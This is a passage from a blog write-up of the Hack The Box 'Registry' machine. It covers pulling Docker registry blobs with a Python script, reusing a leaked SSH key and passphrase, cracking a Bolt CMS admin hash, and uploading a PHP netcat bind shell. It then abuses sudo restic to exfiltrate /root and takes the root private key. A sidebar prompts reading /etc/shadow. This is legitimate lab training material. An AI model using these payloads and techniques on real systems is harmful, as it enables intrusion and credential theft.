				<span class="k">if</span> <span class="n">target_tag</span> <span class="ow">in</span> <span class="n">tags</span><span class="p">:</span>
					<span class="n">list_blobs</span><span class="p">(</span><span class="n">target_repo</span><span class="p">,</span><span class="n">target_tag</span><span class="p">)</span>

					<span class="n">dirname</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">Give a directory name:  "</span><span class="p">)</span>
					<span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">dirname</span><span class="p">)</span>
					<span class="k">print</span> <span class="s">"Now sit back and relax. I will download all the blobs for you in %s directory. </span><span class="si">\</span><span class="se">n</span><span class="s">Open the directory, unzip all the files and explore like a Boss. "</span> <span class="o">%</span> <span class="n">dirname</span>
					<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">final_list_of_blobs</span><span class="p">:</span>
						<span class="k">print</span> <span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">[+] Downloading Blob: %s"</span> <span class="o">%</span> <span class="n">x</span>
						<span class="n">download_blobs</span><span class="p">(</span><span class="n">target_repo</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">dirname</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="k">print</span> <span class="s">"No such Tag Available. Qutting...."</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="k">print</span> <span class="s">"[+] No Tags Available. Quitting...."</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">print</span> <span class="s">"No such repo found. Quitting...."</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">[-] Please use -u option to define API Endpoint, e.g. https://IP:Port</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>Running the script, im able to fetch the Blobs.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python2.7 docketfetch.py <span class="nt">-u</span> https://docker.registry.htb <span class="nt">-a</span> <span class="s2">"Basic YWRtaW46YWRtaW4="</span>
</pre></table></code></div></div><p><img src="/img/registry/2020-04-04-14-52-10.png" alt="" /></p><h3 id="bolt-image">bolt-image</h3><p>Upon finishing the download, extracting the file, and this is what i got.</p><p><img src="/img/registry/2020-04-04-17-07-49.png" alt="" /></p><h4 id="bash_history">.bash_history</h4><p>In enumeration process, i found interesting command history by looking in .bash_history file in root dir</p><ol><li>ssh key generation</li><li>the priv key location</li><li>shell script executed</li></ol><p><img src="/img/registry/2020-04-04-17-14-25.png" alt="" /></p><h4 id="etcprofiled01-sshsh">/etc/profile.d/01-ssh.sh</h4><p>There is shell script to run ssh and i found the passphrase for the ssh</p><p><img src="/img/registry/2020-04-04-23-34-47.png" alt="" /></p><h2 id="exploitation">Exploitation</h2><h3 id="ssh">SSH</h3><p>With all the info collected, now i have the username and passphrase for ssh.</p><p><code class="highlighter-rouge">ssh -i bolt-image/root/.ssh/id_rsa bolt@10.10.10.159</code> passphrase:<strong>GkOcz221Ftb3ugog</strong></p><p><img src="/img/registry/2020-04-04-17-21-08.png" alt="" /></p><p>Successfuly logged in.</p><h3 id="user-flag">User Flag</h3><p>With ssh access, just ls the home dir, and got the user.txt</p><p><img src="/img/registry/2020-04-04-17-37-08.png" alt="" /></p><h3 id="privesc">Privesc</h3><p>I begin another enumeration. Using enumeration script, found useful command being run. I gotta find where this command was executed</p><p><img src="/img/registry/2020-04-04-18-23-23.png" alt="" /></p><h4 id="varwwwhtmlbackupphp">/var/www/html/backup.php</h4><p>Upon looking for restic command being run by sudo, i hit this file. and checking it contents, surely this file can run sudo restic command</p><p><img src="/img/registry/2020-04-04-18-44-46.png" alt="" /></p><p>this file actually in website dir. This means the command can be executed by www-data. I gotta find login credential for bolt login page i left earlier.</p><h4 id="boltdb">bolt.db</h4><p>Deeper looking in /var/www/html dir, found bolt.db in bolt/app/database. Inside the file, I can see admin hash there</p><p><img src="/img/registry/2020-04-04-18-52-23.png" alt="" /></p><h4 id="cracking-the-hash">Cracking the hash</h4><p>Copied the hash found in bolt.db, then crack it using john will reveal the password.</p><p><img src="/img/registry/2020-04-04-18-54-36.png" alt="" /></p><p>Nice, password cracked: <strong>strawberry</strong></p><h4 id="bolt-cms">Bolt CMS</h4><p>Visit the page again, logged in with the cracked password</p><p>username: <strong>admin</strong> password: <strong>strawberry</strong></p><p><img src="/img/registry/2020-04-04-19-52-53.png" alt="" /></p><h4 id="php-upload">PHP Upload</h4><p>After testing some of the functions in the admin panel, it seems i can upload php file. By default it wont accept php extension, but I can changed that in the settings</p><p><img src="/img/registry/2020-04-04-20-31-03.png" alt="" /></p><p><em>When trying using revershell, it not connecting back to my listener. Verify it with bolt ssh, seem reverse shell wont work. so i need bind shell. Im just using simple approach, i uploaded my nc to the server because the nc in the server not working with -e flag. Using scp command, im transfering nc to /var/tmp dir</em>.</p><p><img src="/img/registry/2020-04-04-22-25-23.png" alt="" /></p><p>and the php code im uploaded named shell.php</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"/var/tmp/nc -lnvp 31337 -e /bin/bash"</span><span class="p">);</span>
</pre></table></code></div></div><p><img src="/img/registry/2020-04-04-22-12-27.png" alt="" /></p><h4 id="shell">Shell</h4><p>By the time my php file uploaded, i quickly open the file because in my testing process, any file uploaded will be deleted in short time.</p><p>Then just using nc from my local machine to access the open port in the machine to spawn bash.</p><p><img src="/img/registry/2020-04-04-20-55-03.png" alt="" /></p><h4 id="sudo-right">Sudo right</h4><p>Im checking sudo right instantly after getting the shell. Yeah, www-data is allowed to run sudo.</p><p><img src="/img/registry/2020-04-04-20-58-45.png" alt="" /></p><h3 id="restic">Restic</h3><p>This tool is new to me actually, had to read their documentation to get basic understanding how it work.</p><p>In short, with sudo right, it can backup any file using restic to rest backend. So im planning on backup root dir.</p><h4 id="init-repo">Init Repo</h4><p>Because of the security using this tool, its better im using my own repo. Here the command</p><p><code class="highlighter-rouge">restic init --repo &lt;repo-name&gt;</code></p><p><img src="/img/registry/2020-04-04-21-11-27.png" alt="" /></p><h4 id="rest-server">rest-server</h4><p>Due to sudo command only allowed restic to backup to rest backend, i need some way to create rest backend. Luckily restic came with rest-server cli. Download it, and transfer it to target.</p><p><strong>Transfering</strong></p><p><img src="/img/registry/2020-04-04-21-29-08.png" alt="" /></p><p><strong>Starting rest backend</strong></p><p>Using nc i need to put ampersand (&amp;) to the end of command, so it will go to background, otherwise i gotta kill my shell to end the process.</p><p><img src="/img/registry/2020-04-04-22-50-42.png" alt="" /></p><h4 id="abusing-sudo-restic-command">Abusing sudo restic command</h4><p>Just using what sudo command allowed to create backup.</p><p><img src="/img/registry/2020-04-04-21-40-10.png" alt="" /></p><h4 id="snapshot-list-and-restoring">Snapshot list and restoring</h4><p>Verify the dir exist in my repo using snapshot options. Then using restore command followed with the snapshot id.</p><p><em>the 1st snapshot there was my test file</em></p><p><img src="/img/registry/2020-04-04-21-43-12.png" alt="" /></p><h3 id="root-dir">Root Dir</h3><h4 id="list">List</h4><p>Looks i can list all root content there</p><p><img src="/img/registry/2020-04-04-21-42-31.png" alt="" /></p><h4 id="root-flag">Root Flag</h4><p>Just cat the flag then</p><p><img src="/img/registry/2020-04-04-21-43-51.png" alt="" /></p><h4 id="priv-key">Priv key</h4><p>Im grabbing root priv_key for stable access to root</p><p><img src="/img/registry/2020-04-04-21-45-05.png" alt="" /></p><h4 id="root-ssh">Root SSH</h4><p>And yeehaa!</p><p><img src="/img/registry/2020-04-04-21-47-04.png" alt="" /></p><h2 id="reference">Reference</h2><ol><li>https://bolt.cm/</li><li>https://restic.net/</li><li>https://github.com/restic/rest-server</li></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/machine/'>machine</a>, <a href='/categories/writeup/'>writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box Write Up - Registry - zRyuki&url=https://zeroryuki.github.io/posts/Registry/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box Write Up - Registry - zRyuki&u=https://zeroryuki.github.io/posts/Registry/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box Write Up - Registry - zRyuki&url=https://zeroryuki.github.io/posts/Registry/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/zeroryuki/ © 2020 zRyuki MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Traceback/" class="btn btn-outline-primary"><p>Hack The Box Write Up - Traceback</p></a> <a href="/posts/Traverxec/" class="btn btn-outline-primary"><p>Hack The Box Write Up - Traverxec</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT License --><div id="disqus_thread" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> /* * * CONFIGURATION VARIABLES * * */ var disqus_shortname = "zryuki-space"; var disqus_identifier = "/posts/Registry"; var disqus_url = "https://zeroryuki.github.io/posts/Registry/"; if (document.getElementById('disqus_thread')) { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); } </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Traverxec/"><div class="card-body"> <span class="timeago small"> Apr 9, 2020 <i class="unloaded">2020-04-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Traverxec</h3><div class="text-muted small"><p>Information Gathering As usual, i start my recon with nmap. Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.80SVN scan initiated Thu Dec 5 21:18:15 2019 as: nm...</p></div></div></a></div><div class="card"> <a href="/posts/mango/"><div class="card-body"> <span class="timeago small"> Apr 17, 2020 <i class="unloaded">2020-04-17T21:34:29+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Mango</h3><div class="text-muted small"><p>Info Gathering Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 6...</p></div></div></a></div><div class="card"> <a href="/posts/servmon/"><div class="card-body"> <span class="timeago small"> Apr 19, 2020 <i class="unloaded">2020-04-19T22:26:59+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - ServMon</h3><div class="text-muted small"><p>Info Gathering Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 6...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/username">zRyuki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-145714645-1', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zeroryuki.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script><div class="modal fade" id="howModal" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;"><div class="modal-dialog"><div class="modal-content"><div class="modal-header text-center"><div class="row"><div class="col-lg-12"> <img src="/img/registry/icon.png" style="height: 40px"><h4 data-toc-skip class="modal-title">REGISTRY</h4><small>This is an active Linux machine. You will need root's shadow hash to read the content</small><br></div></div></div><div class="modal-body"><div class="row"><div class="col-lg-12"><h4 data-toc-skip>How to unlock</h4><span class="subscriptionInfo"><p><i class="fas fa-hashtag"></i> Get machine's root Shadow<br> <code class="highlighter-rouge"><small>cat /etc/shadow | grep root</small></code></p><p><i class="fas fa-hashtag"></i> Hash<br> <code class="highlighter-rouge"><small>echo "{shadow value}" | md5sum</small></code></p><p><i class="fas fa-sign-in-alt"></i> Add hash below</p></span><div class="row"><div class="col-lg-8"> <input type="text" placeholder="Insert hash here.." value="" name="key" id="key" class="form-control"></div><div class="col-lg-4"> <span role="button" tabindex="0"> <button id="decrypt" tabindex="-1" type="submit" class="decrypt-btn" style="background-color: rgb(154, 204, 20); border-color: rgb(154, 204, 20); color: white;"> Decrypt </button> </span></div></div></div><div class="col-lg-12 text-center m-t-md" id="recurlyBalanceControlPanel"> You have <span class="text-warning">-</span> remaining attempt</div></div></div><div class="modal-footer"> <button type="button" class="btn btn-default" data-dismiss="modal"><i class="far fa-times"></i></button></div></div></div></div>
